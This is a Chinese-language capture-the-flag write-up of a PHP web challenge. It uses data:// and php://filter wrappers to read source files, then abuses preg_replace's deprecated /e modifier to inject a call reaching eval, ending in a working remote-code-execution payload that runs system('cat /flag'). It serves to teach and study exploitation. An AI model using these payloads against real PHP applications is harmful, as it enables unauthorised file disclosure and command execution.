![[Pasted image 20221115160913.png]]
```php
<?php
error_reporting(0);
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }
    
    include($file);  //next.php
}
else{
    highlight_file(__FILE__);
}
?>
```
---
```shell
/?text=data://text/plain,I have a dream&file=next.php
```
![[Pasted image 20221115161441.png]]

话说回来如果我这样写的话不是还不如直接访问`next.php`嘛QwQ
```shell
/?text=data://text/plain,I have a dream&file=php://filter/read=convert.base64-encode/resource=next.php
```

> PD9waHAKJGlkID0gJF9HRVRbJ2lkJ107CiRfU0VTU0lPTlsnaWQnXSA9ICRpZDsKCmZ1bmN0aW9uIGNvbXBsZXgoJHJlLCAkc3RyKSB7CiAgICByZXR1cm4gcHJlZ19yZXBsYWNlKAogICAgICAgICcvKCcgLiAkcmUgLiAnKS9laScsCiAgICAgICAgJ3N0cnRvbG93ZXIoIlxcMSIpJywKICAgICAgICAkc3RyCiAgICApOwp9CgoKZm9yZWFjaCgkX0dFVCBhcyAkcmUgPT4gJHN0cikgewogICAgZWNobyBjb21wbGV4KCRyZSwgJHN0cikuICJcbiI7Cn0KCmZ1bmN0aW9uIGdldEZsYWcoKXsKCUBldmFsKCRfR0VUWydjbWQnXSk7Cn0K

解码后长这样
```php
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}


foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
	@eval($_GET['cmd']);
}
```
有一个`getFlag()`函数，但是应该怎么调用它呢......

乍一看枚举、正则替换、回显一气呵成，貌似并没有机会

但是细看发现`preg_replace`中的正则表达式有一个没有见过的修饰符`e`

结果翻了半天官方文档也没翻到这个修饰符

翻谷歌发现这玩意早在`php 5.5.0`时代就被弃用，在`7.0.0`中被移除

查看响应中的`X-Powered-By`头，其值为`PHP/5.6.40`，刚好可以使用`e`修饰符
> 如果设置了这个被弃用的修饰符，[preg_replace()](https://www.php.net/manual/zh/function.preg-replace.php) 在进行了对替换字符串的后向引用替换之后, 将替换后的字符串作为`php`代码评估执行(`eval`函数方式)，并使用执行结果 作为实际参与替换的字符串。单引号、双引号、反斜线（`\`）和 NULL 字符在后向引用替换时会被用反斜线转义。

`'strtolower("\\1")'`中使用的是双引号，这意味着可以内插变量，利用这一点插入对`getFlag`的调用

对于`$re`，参考佬的wp，使用`\S*`以匹配所有非空白字符，同时避免`php`对某些特殊字符的处理
```php
/next.php?\S*=${getFlag()}&cmd=system('cat /flag');
```
> flag{a1a7ed7e-d4a8-403c-8d74-d1da5f631dd2} system('cat /flag');

#Web #PHP #函数 #伪协议 #RCE #正则表达式 #可变变量